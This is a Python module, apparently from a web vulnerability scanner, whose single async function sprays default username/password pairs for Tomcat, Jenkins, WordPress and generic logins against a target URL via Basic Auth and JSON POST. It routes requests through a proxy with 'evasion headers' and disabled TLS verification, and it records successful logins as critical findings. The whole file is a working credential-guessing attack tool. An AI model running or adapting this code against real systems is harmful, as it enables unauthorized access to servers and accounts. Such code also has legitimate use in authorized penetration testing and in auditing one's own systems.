import aiohttp
import asyncio
import base64

async def exploit_default_creds(url, technology=None, log_callback=None, headers=None, proxy=None):
    """
    Sprays default credentials based on detected technology (Tomcat, Jenkins, etc).
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    creds_db = {
        "TOMCAT": [("tomcat", "tomcat"), ("admin", "admin"), ("role1", "tomcat")],
        "JENKINS": [("admin", "admin"), ("admin", "password"), ("jenkins", "jenkins")],
        "WORDPRESS": [("admin", "password"), ("user", "user"), ("webmaster", "password")],
        "BASIC": [("admin", "admin"), ("guest", "guest"), ("root", "root")],
        "MONGODB": [], # Usually connection string, not HTTP
        "ACTUAL_DEFAULT": [("admin", "admin")] # Fallback
    }
    
    target_tech = "ACTUAL_DEFAULT"
    if technology:
        for k in creds_db:
             if k in technology.upper():
                 target_tech = k
                 break
                 
    target_pair = creds_db.get(target_tech, creds_db["ACTUAL_DEFAULT"])
    
    try:
        async with aiohttp.ClientSession(headers=final_headers) as session:
            for u, p in target_pair:
                if log_callback: log_callback(f"   üóùÔ∏è Default Creds: Spraying {u}:{p} against {technology}...")
                
                # Check 1: Basic Auth
                auth = aiohttp.BasicAuth(u, p)
                try:
                    # Note: BasicAuth header might override Authorization header in final_headers.
                    # This is desired.
                    async with session.get(url, auth=auth, timeout=5, ssl=False, proxy=proxy) as resp:
                        if resp.status == 200:
                            findings.append({
                                "type": f"Default Credentials ({target_tech})",
                                "severity": "Critical",
                                "detail": f"Successfully authenticated with default credentials.",
                                "evidence": f"User: {u}, Pass: {p}",
                                "remediation": "Change default passwords immediately."
                            })
                            return findings
                except: pass
                
                # Check 2: Form/JSON Post (Generic)
                # Need to guess param names? username/password
                try:
                    data = {"username": u, "password": p}
                    async with session.post(url, json=data, timeout=5, ssl=False, proxy=proxy) as resp:
                        if resp.status == 200:
                             t = await resp.text()
                             if "success" in t.lower() or "token" in t:
                                  findings.append({
                                    "type": f"Default Credentials ({target_tech})",
                                    "severity": "Critical",
                                    "detail": f"Successfully login with default credentials.",
                                    "evidence": f"User: {u}, Pass: {p}",
                                    "remediation": "Change default passwords."
                                })
                                  return findings
                except: pass
                
    except: pass
    
    return findings
